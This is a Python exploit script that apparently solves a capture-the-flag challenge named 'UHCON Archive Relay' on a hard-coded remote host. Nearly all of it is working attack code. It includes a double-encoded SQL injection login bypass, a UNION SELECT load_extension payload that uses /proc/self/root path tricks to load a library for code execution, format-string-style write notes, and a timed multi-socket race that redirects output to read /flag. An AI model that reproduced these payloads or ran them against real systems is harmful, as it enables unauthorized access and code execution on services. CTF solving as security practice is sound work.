#!/usr/bin/env python3
"""Remote solver for UHCON Archive Relay."""

from __future__ import annotations

import http.client
import importlib.util
import json
from pathlib import Path
import re
import select
import socket
import time
import urllib.parse


ROOT = Path(__file__).resolve().parent
BOOTSTRAP_HOST = "3.34.239.114"
BOOTSTRAP_PORT = 1337

spec = importlib.util.spec_from_file_location("sh_sweep", ROOT / "root_sh_marker_sweep.py")
sh_sweep = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(sh_sweep)


def bootstrap_instance() -> tuple[socket.socket, int, bytes]:
    sock = socket.create_connection((BOOTSTRAP_HOST, BOOTSTRAP_PORT), timeout=10)
    sock.settimeout(15)
    banner = bytearray()
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        block = sock.recv(4096)
        if not block:
            break
        banner.extend(block)
        match = re.search(rb"site:\s*http://[^:]+:(\d+)/", banner)
        if match:
            return sock, int(match.group(1)), bytes(banner)
    sock.close()
    raise RuntimeError(f"bootstrap banner did not contain a port: {bytes(banner)!r}")


def request(host: str, port: int, method: str, path: str, *, headers=None, body: bytes = b""):
    conn = http.client.HTTPConnection(host, port, timeout=6)
    conn.request(method, path, body=body, headers=headers or {})
    response = conn.getresponse()
    data = response.read()
    status = response.status
    conn.close()
    return status, data


def operator_session(host: str, port: int) -> str:
    body = (
        b"account=x%2527%2520OR%2520role%253D%2527operator%2527"
        b"%2520%252D%252D%2520&pin=x"
    )
    status, data = request(
        host, port, "POST", "/api/login",
        headers={"Content-Type": "application/x-www-form-urlencoded"}, body=body,
    )
    if status != 200:
        raise RuntimeError((status, data))
    match = re.search(rb'"session":"([0-9a-f]+)"', data)
    if not match:
        raise RuntimeError(data)
    return match.group(1).decode()


def trace(host: str, port: int, session: str, note: str) -> tuple[int, bytes]:
    return request(
        host, port, "POST", "/api/trace",
        headers={"X-Session": session, "X-Trace-Note": note},
    )


def login_request(host: str, port: int, library: str) -> bytes:
    sql = f"x' UNION SELECT load_extension('{library}','system') -- "
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    return (
        f"POST /api/login HTTP/1.1\r\nHost: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body


def busy_wait_us(value: int) -> None:
    target = time.perf_counter_ns() + value * 1000
    while time.perf_counter_ns() < target:
        pass


def recv_all(sockets: list[socket.socket], timeout: float = 8.0) -> list[bytes]:
    buffers = [bytearray() for _ in sockets]
    by_fd = {sock.fileno(): index for index, sock in enumerate(sockets)}
    live = set(sockets)
    deadline = time.monotonic() + timeout
    while live and time.monotonic() < deadline:
        readable, _, _ = select.select(list(live), [], [], 0.1)
        for sock in readable:
            index = by_fd[sock.fileno()]
            try:
                data = sock.recv(65536)
            except (ConnectionResetError, OSError):
                data = b""
            if data:
                buffers[index].extend(data)
            else:
                live.remove(sock)
    for sock in sockets:
        sock.close()
    return [bytes(buffer) for buffer in buffers]


def race(host: str, port: int, session: str, lead_us: int, library: str) -> list[bytes]:
    final_note = sh_sweep.redirect_final_note("/flag", 6)
    seed_note = sh_sweep.archive.write_note(0x02, 0x2A20, "n", tail_width=0)
    login_sock = socket.create_connection((host, port), timeout=5)
    final_sock = socket.create_connection((host, port), timeout=5)
    seed_sock = socket.create_connection((host, port), timeout=5)
    for sock in (login_sock, final_sock, seed_sock):
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    time.sleep(0.01)  # allow the server to accept sockets in FD 6/7/8 order
    login_sock.sendall(login_request(host, port, library))
    busy_wait_us(lead_us)
    final_sock.sendall(sh_sweep.archive.raw_trace_request(host, port, session, final_note))
    seed_sock.sendall(sh_sweep.archive.raw_trace_request(host, port, session, seed_note))
    return recv_all([login_sock, final_sock, seed_sock])


def main() -> None:
    leads = [50, 100, 200, 350, 500, 750, 1000, 1500, 2000, 3000, 5000]
    libraries = [
        "/proc/self/root" * 5 + "/usr/lib/x86_64-linux-gnu/libkrb5.so.3",
        "/usr/lib/x86_64-linux-gnu/libkrb5.so.3",
    ]
    attempts: list[dict[str, object]] = []
    for attempt_index in range(44):
        lead_us = leads[attempt_index % len(leads)]
        library = libraries[(attempt_index // len(leads)) % len(libraries)]
        bootstrap = None
        try:
            bootstrap, port, banner = bootstrap_instance()
            session = operator_session(BOOTSTRAP_HOST, port)
            enable = sh_sweep.archive.write_note(0x32, 0x07, "hhn")
            status, body = trace(BOOTSTRAP_HOST, port, session, enable)
            if status != 202:
                raise RuntimeError((status, body))
            time.sleep(0.08)
            responses = race(BOOTSTRAP_HOST, port, session, lead_us, library)
            combined = b"\n".join(responses)
            match = re.search(rb"FLAG\{[^}\r\n]+\}", combined)
            row = {
                "attempt": attempt_index,
                "port": port,
                "lead_us": lead_us,
                "library": library,
                "response_lengths": [len(item) for item in responses],
                "captured": bool(match),
                "banner": banner.decode("utf-8", "replace"),
            }
            attempts.append(row)
            print(json.dumps(row, sort_keys=True), flush=True)
            if match:
                flag = match.group(0).decode()
                with open(f"{ROOT}/flag.txt", "w", encoding="utf-8") as handle:
                    handle.write(flag + "\n")
                with open(f"{ROOT}/remote_success.json", "w", encoding="utf-8") as handle:
                    json.dump({"flag": flag, "attempt": row, "attempts": attempts}, handle, indent=2)
                print("CAPTURED", flag, flush=True)
                return
        except Exception as error:
            row = {"attempt": attempt_index, "lead_us": lead_us, "error": repr(error)}
            attempts.append(row)
            print(json.dumps(row, sort_keys=True), flush=True)
        finally:
            if bootstrap is not None:
                bootstrap.close()
    with open(f"{ROOT}/remote_attempts.json", "w", encoding="utf-8") as handle:
        json.dump(attempts, handle, indent=2)
    raise SystemExit("remote flag was not captured")


if __name__ == "__main__":
    main()
